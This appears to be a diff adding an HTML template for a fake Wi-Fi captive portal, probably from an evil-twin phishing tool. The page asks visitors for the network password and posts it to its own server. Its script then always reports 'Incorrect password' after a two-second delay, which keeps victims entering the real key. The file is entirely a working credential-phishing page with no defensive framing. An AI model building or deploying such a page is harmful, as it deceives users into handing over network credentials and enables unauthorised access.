@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ page_title }}</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #0c1445 0%, #1a237e 50%, #283593 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+        }
+        .portal-container {
+            background: rgba(255,255,255,0.95);
+            border-radius: 16px;
+            padding: 48px 40px;
+            max-width: 420px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            color: #1a237e;
+            text-align: center;
+        }
+        .portal-logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #1a237e, #3949ab);
+            border-radius: 50%;
+            margin: 0 auto 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 36px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 32px;
+            line-height: 1.5;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            color: #333;
+            margin-bottom: 6px;
+        }
+        input[type="password"], input[type="text"] {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 15px;
+            transition: border-color 0.2s;
+            outline: none;
+        }
+        input:focus {
+            border-color: #1a237e;
+        }
+        .connect-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #1a237e, #3949ab);
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.1s, box-shadow 0.2s;
+            margin-top: 8px;
+        }
+        .connect-btn:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(26,35,126,0.4);
+        }
+        .connect-btn:active {
+            transform: translateY(0);
+        }
+        .terms {
+            margin-top: 24px;
+            font-size: 11px;
+            color: #999;
+            line-height: 1.6;
+        }
+        .status {
+            display: none;
+            margin-top: 16px;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 13px;
+        }
+        .status.error {
+            display: block;
+            background: #ffebee;
+            color: #c62828;
+        }
+        .status.success {
+            display: block;
+            background: #e8f5e9;
+            color: #2e7d32;
+        }
+        .loading {
+            display: none;
+            margin-top: 16px;
+        }
+        .loading::after {
+            content: '';
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #1a237e;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="portal-container">
+        <div class="portal-logo">&#128274;</div>
+        <h1>{{ page_title }}</h1>
+        <p class="subtitle">Enter the network password to get connected to the internet.</p>
+
+        <form id="wifiForm" method="POST" action="">
+            <div class="form-group">
+                <label for="password">Wi-Fi Password</label>
+                <input type="password" id="password" name="password"
+                       placeholder="Enter password" required autocomplete="off">
+            </div>
+            <button type="submit" class="connect-btn">Connect</button>
+            <div class="loading" id="loading"></div>
+            <div class="status" id="status"></div>
+        </form>
+
+        <p class="terms">By connecting, you agree to the network usage policy.<br>
+        Protected network &mdash; authorized users only.</p>
+    </div>
+
+    <script>
+        document.getElementById('wifiForm').addEventListener('submit', function(e) {
+            var btn = this.querySelector('.connect-btn');
+            var loading = document.getElementById('loading');
+            var status = document.getElementById('status');
+            btn.style.display = 'none';
+            loading.style.display = 'inline-block';
+            status.className = 'status';
+            status.style.display = 'none';
+
+            setTimeout(function() {
+                loading.style.display = 'none';
+                status.className = 'status error';
+                status.textContent = 'Incorrect password. Please try again.';
+                status.style.display = 'block';
+                btn.style.display = 'block';
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
